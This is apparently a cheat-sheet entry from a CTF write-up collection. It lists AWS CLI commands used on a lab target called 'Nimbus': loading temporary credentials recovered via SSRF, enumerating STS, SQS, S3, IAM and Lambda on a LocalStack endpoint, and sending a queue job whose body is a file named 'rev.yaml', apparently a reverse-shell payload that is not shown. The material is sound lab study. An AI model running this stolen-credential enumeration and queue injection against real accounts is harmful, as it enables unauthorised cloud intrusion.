# AWS CLI

AWS CLI is used here against a LocalStack-style endpoint exposed by a CTF target. The commands enumerate STS identity, SQS queues, S3 buckets, IAM users and Lambda functions after temporary credentials are recovered through SSRF.

## Commands Used

### Configure Temporary Credentials
<!-- cmd: linux -->
```bash
export AWS_ACCESS_KEY_ID="<AWS_ACCESS_KEY_ID>"
export AWS_SECRET_ACCESS_KEY="<AWS_SECRET_ACCESS_KEY>"
export AWS_SESSION_TOKEN="<AWS_SESSION_TOKEN>"
export AWS_DEFAULT_REGION="us-east-1"
```
Used on: **Nimbus**

### Enumerate Identity and Services Through a Custom Endpoint
<!-- cmd: linux -->
```bash
aws --endpoint-url http://aws.nimbus.htb sts get-caller-identity
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
aws --endpoint-url http://172.18.0.2:4566 s3 ls
aws --endpoint-url http://172.18.0.2:4566 iam list-users
aws --endpoint-url http://172.18.0.2:4566 lambda list-functions
```
Used on: **Nimbus**

### Read SQS Queue Attributes and Send a Job
<!-- cmd: linux -->
```bash
aws --endpoint-url http://aws.nimbus.htb sqs get-queue-attributes \
  --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
  --attribute-names All

aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
  --message-body file://rev.yaml
```
Used on: **Nimbus**
